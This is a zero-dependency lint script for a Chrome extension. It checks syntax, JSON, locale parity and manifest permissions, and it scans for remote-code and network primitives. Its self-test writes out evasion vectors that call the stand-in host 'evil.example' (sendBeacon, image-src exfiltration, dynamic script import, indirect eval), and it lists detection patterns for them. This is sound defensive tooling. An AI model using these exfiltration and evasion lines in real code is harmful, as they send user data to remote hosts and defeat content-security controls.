// Zero-dependency lint gate for the extension package (current Chrome-extension
// best-practice checks; run before every build/submit):
//   1. syntax    — node --check every .js under extension/
//   2. JSON      — parse manifest + every locale + every .json under extension/
//   3. i18n      — all locales carry an IDENTICAL key set (en is the reference)
//   4. security  — no remote code / network primitives anywhere in extension/
//                  (eval, new Function, fetch, XMLHttpRequest, WebSocket, importScripts,
//                  remote <script src>); local-only dialogs (alert) restricted to the
//                  popup/stats pages, never content/background
//   5. manifest  — minimal permissions allowlist, __MSG_ indirection intact, host sets and
//                  content_scripts matches pinned to the two engine scopes (muse.ai + chatgpt.com)
//   6. lockstep  — the shared safety constants duplicated between content.js and codex.js
//                  (the keyword BLOCK_SEED) must stay byte-identical
// Exit 1 on any finding; prints a compact summary. Usage: node scripts/lint.mjs
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const EXT = path.join(ROOT, 'extension');
const findings = [];
let checked = 0;

function walk(dir, out = []) {
  for (const name of fs.readdirSync(dir)) {
    const p = path.join(dir, name);
    const st = fs.statSync(p);
    if (st.isDirectory()) walk(p, out);
    else out.push(p);
  }
  return out;
}

const files = walk(EXT);
const jsFiles = files.filter((f) => f.endsWith('.js'));
const jsonFiles = files.filter((f) => f.endsWith('.json'));
const SRC_EXTS = ['.js', '.html'];

// ---------------------------------------------------------------------------------------
// fetch-FAMILY zero-network check (F-V19-2) — shared by the main scan and `--self-test`.
// The extension may reach a same-package asset only through `chrome.runtime.getURL(...)`.
// A fetch-family reference is allowed ONLY as the approved alias binding
// `<g>.fetch.bind(<g>)` (g = globalThis|window|self|global), and EVERY call of that alias
// must pass a `chrome.runtime.getURL(...)` argument. Anything else — a bare `fetch(...)`,
// any other `.fetch` reference, or an alias call with a different argument — is flagged, so
// a future edit cannot re-point the alias at a remote URL while the gate stays green.
const FETCH_BIND = /(?:globalThis|window|self|global)\s*\.\s*fetch\s*\.\s*bind\s*\(\s*(?:globalThis|window|self|global)\s*\)/g;
const ALIAS_DEF = /(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*(?:globalThis|window|self|global)\s*\.\s*fetch\s*\.\s*bind\s*\(\s*(?:globalThis|window|self|global)\s*\)/g;
const GETURL_RE = /chrome\.runtime\.getURL\s*\(/;
function callArgs(src, openIdx) {
  let depth = 0;
  for (let i = openIdx; i < src.length; i++) {
    const c = src[i];
    if (c === '(') depth++;
    else if (c === ')') { depth--; if (depth === 0) return src.slice(openIdx + 1, i); }
  }
  return src.slice(openIdx + 1);
}
function fetchFamilyFindings(rel, src) {
  const out = [];
  const aliases = [];
  let m;
  ALIAS_DEF.lastIndex = 0;
  while ((m = ALIAS_DEF.exec(src))) aliases.push(m[1]);
  const masked = src.replace(FETCH_BIND, (s) => ' '.repeat(s.length));
  // F-V19-2 residual (S13 §13.4): the anchor is the `.fetch` member itself, not `.fetch` preceded by
  // a non-identifier char — `globalThis.fetch` (a plain alias acquired without `.bind(`) used to slip
  // past both regexes. The approved `<g>.fetch.bind(<g>)` spelling is masked above, so it stays clean.
  const dotFetch = /\.\s*fetch\b/g;
  while ((m = dotFetch.exec(masked))) out.push(`SEC ${rel}: fetch-family reference ${JSON.stringify(m[0].trim())} outside the approved chrome.runtime.getURL binding`);
  const bareFetch = /(?:^|[^\w$.])fetch\s*\(/g;
  while ((m = bareFetch.exec(masked))) out.push(`SEC ${rel}: bare fetch( call — remote primitive outside the approved alias`);
  for (const name of aliases) {
    const esc = name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const callRe = new RegExp('(?:^|[^\\w$.])' + esc + '\\s*\\(', 'g');
    let c;
    while ((c = callRe.exec(src))) {
      const openIdx = src.indexOf('(', c.index);
      if (!GETURL_RE.test(callArgs(src, openIdx))) out.push(`SEC ${rel}: ${name}(...) is not passed a chrome.runtime.getURL(...) argument — aliased fetch without a same-package URL`);
    }
  }
  return out;
}
// F-V19-2 residual (S13 §13.4): the realistic network / remote-code forms the original token set
// missed — each one a plain, non-adversarial way a future edit could reintroduce a network call.
// Keyed to the PRIMITIVE (not to a URL), so a computed/obfuscated URL cannot slip past. The shipped
// package contains NONE of these forms (verified: zero hits across extension/**), so they add no
// false positive; the only `.src`/innerHTML/`import` uses in the package are a CSS selector, a
// `'<div class="empty">'` innerHTML and static ES imports in the test harnesses (outside extension/).
const REMOTE_CODE = [/\beval\s*\(/, /new\s+Function\s*\(/, /\bfetch\s*\(/, /XMLHttpRequest/, /new\s+WebSocket\s*\(/, /\bimportScripts\s*\(/];
const NET_VECTORS = [
  { re: /\bsendBeacon\s*\(/, label: 'navigator.sendBeacon (CSP does not block it)' },
  { re: /new\s+EventSource\s*\(/, label: 'EventSource (unmodelled network primitive)' },
  { re: /new\s+Image\s*\(/, label: 'new Image( — an <img> exfil channel once .src is set' },
  { re: /\.\s*src\s*=/, label: '.src assignment (remote asset / script / image source)' },
  { re: /createElement\s*\(\s*['"]script['"]\s*\)/, label: "createElement('script') — dynamic remote <script>" },
  { re: /innerHTML\s*=\s*['"][^'"]*<script/i, label: 'innerHTML carrying an inline <script' },
  { re: /(?:^|[^\w$.])import\(|(?:^|[^\w$.])import\s+\(\s*['"`]/, label: 'dynamic import( — remote module load' },
  { re: /\{\s*fetch\b/, label: 'destructured fetch ({ fetch } = …)' },
  { re: /\[\s*['"]fetch['"]\s*\]/, label: "bracket fetch access (window['fetch'])" },
  { re: /Reflect\.get\s*\([^)]*['"]fetch['"]/, label: "Reflect.get(…, 'fetch')" },
  { re: /(?:^|[^\w$.])eval\b(?!\s*\()/, label: 'bare eval reference (indirect eval, e.g. (0,eval))' },
];
// The complete per-file security scan (section 4 + `--self-test` share it, so the self-test proves
// the rule set the gate actually runs).
function securityFindings(rel, src, isHtml) {
  const out = [];
  for (const re of REMOTE_CODE) if (re.test(src)) out.push(`SEC ${rel}: forbidden primitive ${re}`);
  for (const v of NET_VECTORS) if (v.re.test(src)) out.push(`SEC ${rel}: forbidden network/remote-code form — ${v.label}`);
  out.push(...fetchFamilyFindings(rel, src));
  if (isHtml && /src\s*=\s*["']https?:/i.test(src)) out.push(`SEC ${rel}: remote <script src>`);
  if (/\balert\s*\(/.test(src) && !/\/(popup|stats)\.js$/.test(rel)) out.push(`SEC ${rel}: alert() outside popup/stats`);
  return out;
}
// `--self-test`: prove the rule set on the shipped package plus one mutation per vector. Exits
// non-zero on any miss (a vector that is NOT caught) or any false positive on the shipped sources.
if (process.argv.includes('--self-test')) {
  const shipped = fs.readFileSync(path.join(EXT, 'popup.js'), 'utf8');
  const shippedAll = walk(EXT)
    .filter((f) => SRC_EXTS.some((x) => f.endsWith(x)))
    .map((f) => fs.readFileSync(f, 'utf8')).join('\n');
  const vectors = [
    ['raw fetch', "\nfetch('https://evil.example');\n"],
    ['readAsset(remote)', null], // handled below (needs the shipped alias call replaced)
    ['navigator.sendBeacon', "\nnavigator.sendBeacon('https://evil.example/x', 'd');\n"],
    ['new EventSource', "\nnew EventSource('https://evil.example/x');\n"],
    ['new Image + .src', "\nconst im = new Image(); im.src = 'https://evil.example/x?d=' + Date.now();\n"],
    ["createElement('script') + .src", "\ndocument.createElement('script').src = 'https://evil.example/x.js';\n"],
    ['dynamic import(', "\nimport('https://evil.example/x.js');\n"],
    ['destructured fetch', "\nconst { fetch: f } = window; f('https://evil.example/x');\n"],
    ["window['fetch']", "\nwindow['fetch']('https://evil.example/x');\n"],
    ["Reflect.get(…,'fetch')", "\nReflect.get(globalThis, 'fetch')('https://evil.example/x');\n"],
    ['(0,eval)', "\n(0, eval)('fetch')('https://evil.example/x');\n"],
    ['plain fetch alias without .bind', "\nconst rf = globalThis.fetch; rf('https://evil.example/x');\n"],
    ['innerHTML with <script src>', "\ndocument.body.innerHTML = '<script src=\"https://evil.example/x.js\"></script>';\n"],
  ];
  const cases = [
    { name: 'shipped popup.js (bound alias + chrome.runtime.getURL) => expect NO finding', src: shipped, want: 0 },
    { name: 'ALL shipped extension/** sources => expect NO finding (no false positive)', src: shippedAll, want: 0 },
    { name: 'raw fetch(remote)', src: shipped + vectors[0][1], want: 1 },
    { name: "readAsset('https://evil.example')", src: shipped.replace(/readAsset\(chrome\.runtime\.getURL\([^)]*\)\)/, "readAsset('https://evil.example')"), want: 1 },
    ...vectors.slice(2).map(([n, v]) => ({ name: n, src: shipped + v, want: 1 })),
  ];
  let bad = 0;
  for (const c of cases) {
    const found = securityFindings('extension/popup.js', c.src, false);
    const ok = c.want === 0 ? found.length === 0 : found.length >= 1;
    if (!ok) bad++;
    console.log((ok ? 'PASS  ' : 'FAIL  ') + c.name + (found.length ? '\n        ' + found.join('\n        ') : ''));
  }
  console.log('lint --self-test: ' + (bad ? bad + ' of ' + cases.length + ' case(s) FAILED' : 'all ' + cases.length + ' cases PASS'));
  process.exit(bad ? 1 : 0);
}

// 1. syntax
for (const f of jsFiles) {
  checked++;
  try {
    execFileSync(process.execPath, ['--check', f], { stdio: 'pipe' });
  } catch (e) {
    findings.push(`SYNTAX ${path.relative(ROOT, f)}: ${String(e.stderr || e.message).split('\n')[0]}`);
  }
}

// 2. JSON
for (const f of jsonFiles) {
  checked++;
  try {
    JSON.parse(fs.readFileSync(f, 'utf8'));
  } catch (e) {
    findings.push(`JSON ${path.relative(ROOT, f)}: ${e.message}`);
  }
}

// 3. i18n parity
try {
  const locDir = path.join(EXT, '_locales');
  const locales = fs.readdirSync(locDir).filter((d) => fs.statSync(path.join(locDir, d)).isDirectory());
  const keySets = {};
  for (const loc of locales) {
    const p = path.join(locDir, loc, 'messages.json');
    if (!fs.existsSync(p)) { findings.push(`I18N missing ${loc}/messages.json`); continue; }
    keySets[loc] = new Set(Object.keys(JSON.parse(fs.readFileSync(p, 'utf8'))));
    checked++;
  }
  const ref = keySets['en'];
  if (!ref) findings.push('I18N no en reference locale');
  else {
    for (const [loc, ks] of Object.entries(keySets)) {
      if (loc === 'en' || !ks) continue;
      for (const k of ref) if (!ks.has(k)) findings.push(`I18N ${loc}: missing key "${k}"`);
      for (const k of ks) if (!ref.has(k)) findings.push(`I18N ${loc}: extra key "${k}"`);
    }
  }
} catch (e) {
  findings.push(`I18N scan failed: ${e.message}`);
}

// 4. security — remote code / network primitives (the shared scanner above: REMOTE_CODE +
//    NET_VECTORS + the fetch-family alias rule + remote <script src> + alert placement)
for (const f of files.filter((f) => SRC_EXTS.some((x) => f.endsWith(x)))) {
  checked++;
  const rel = path.relative(ROOT, f).replace(/\\/g, '/');
  const src = fs.readFileSync(f, 'utf8');
  for (const msg of securityFindings(rel, src, f.endsWith('.html'))) findings.push(msg);
}

// 5. manifest hygiene
try {
  const man = JSON.parse(fs.readFileSync(path.join(EXT, 'manifest.json'), 'utf8'));
  checked++;
  if (man.manifest_version !== 3) findings.push('MANIFEST not MV3');
  const ALLOWED = new Set(['storage', 'alarms', 'notifications']);
  for (const p of man.permissions || []) if (!ALLOWED.has(p)) findings.push(`MANIFEST unexpected permission "${p}"`);
  if (String(man.name || '') !== '__MSG_extName__') findings.push('MANIFEST name must use __MSG_extName__');
  if (!man.default_locale) findings.push('MANIFEST missing default_locale');
  // v1.10.0: TWO pinned engine scopes. host_permissions powers the background/popup tab
  // queries and nudges; content_scripts matches decide where each engine's script is
  // injected — both pinned exactly, per engine.
  const hosts = (man.host_permissions || []).join(', ');
  if (!/^https:\/\/muse\.ai\/\*, https:\/\/\*\.muse\.ai\/\*, https:\/\/chatgpt\.com\/\*, https:\/\/\*\.chatgpt\.com\/\*$/i.test(hosts)) {
    findings.push(`MANIFEST host_permissions unexpected: ${hosts}`);
  }
  const cs = man.content_scripts || [];
  const scriptEntry = (file) => cs.find((e) => Array.isArray(e.js) && e.js.indexOf(file) !== -1) || {};
  const museEntry = scriptEntry('content.js');
  const codexEntry = scriptEntry('codex.js');
  if ((museEntry.matches || []).join(', ') !== 'https://muse.ai/*, https://*.muse.ai/*') {
    findings.push(`MANIFEST content_scripts[content.js] matches unexpected: ${(museEntry.matches || []).join(', ')}`);
  }
  if ((codexEntry.matches || []).join(', ') !== 'https://chatgpt.com/*, https://*.chatgpt.com/*') {
    findings.push(`MANIFEST content_scripts[codex.js] matches unexpected: ${(codexEntry.matches || []).join(', ')}`);
  }
  if (!man.content_security_policy || !man.content_security_policy.extension_pages) {
    findings.push('MANIFEST missing explicit extension_pages CSP');
  }
} catch (e) {
  findings.push(`MANIFEST scan failed: ${e.message}`);
}

// 6. shared-rule lockstep (v1.10.0) — the keyword block-list seed is a frozen safety
//    contract shared by BOTH engines: content.js BLOCK_SEED and codex.js BLOCK_SEED must
//    stay identical, or a drifted copy would silently change what one engine blocks.
try {
  checked++;
  const seedOf = (rel) => {
    const src = fs.readFileSync(path.join(EXT, rel), 'utf8');
    const m = src.match(/const BLOCK_SEED = \[([\s\S]*?)\];/);
    return m ? m[1].replace(/\s+/g, ' ').trim() : null;
  };
  const a = seedOf('content.js');
  const b = seedOf('codex.js');
  if (!a || !b) findings.push(`SEED lockstep: BLOCK_SEED not found (${a ? 'codex.js' : 'content.js'})`);
  else if (a !== b) findings.push('SEED lockstep: content.js and codex.js BLOCK_SEED differ');
} catch (e) {
  findings.push(`SEED lockstep scan failed: ${e.message}`);
}

// 7. license guards (v1.21.0 / W4) — the committed public key must stay null until the Owner's
//    key ceremony, and no EC public JWK literal may ever appear in extension sources or locale
//    JSON: fixture keys belong under test/ only and must never reach the release artifact.
try {
  checked++;
  const pubSrc = fs.readFileSync(path.join(EXT, 'license-pubkey.js'), 'utf8');
  if (!/var\s+MAA_LICENSE_PUBKEY\s*=\s*null\s*;/.test(pubSrc)) {
    findings.push('LICENSE-PUBKEY-DORMANT: extension/license-pubkey.js must hold "var MAA_LICENSE_PUBKEY = null;" until the Owner key ceremony');
  }
  const jwkRe = /"kty"\s*:\s*"EC"|"crv"\s*:\s*"P-256"/;
  for (const f of files.filter((f) => SRC_EXTS.some((x) => f.endsWith(x)) || f.endsWith('.json'))) {
    checked++;
    const rel = path.relative(ROOT, f).replace(/\\/g, '/');
    if (jwkRe.test(fs.readFileSync(f, 'utf8'))) {
      findings.push(`LICENSE-TEST-KEY-NOT-IN-RELEASE: ${rel} contains an EC public JWK literal (fixture keys belong under test/ only)`);
    }
  }
} catch (e) {
  findings.push(`LICENSE guards scan failed: ${e.message}`);
}

// summary
if (findings.length) {
  console.error(`lint: ${findings.length} finding(s)\n` + findings.map((f) => '  - ' + f).join('\n'));
  process.exit(1);
}
console.log(`lint OK — ${checked} checks across ${files.length} files (syntax, JSON, i18n parity, no remote code, minimal permissions)`);
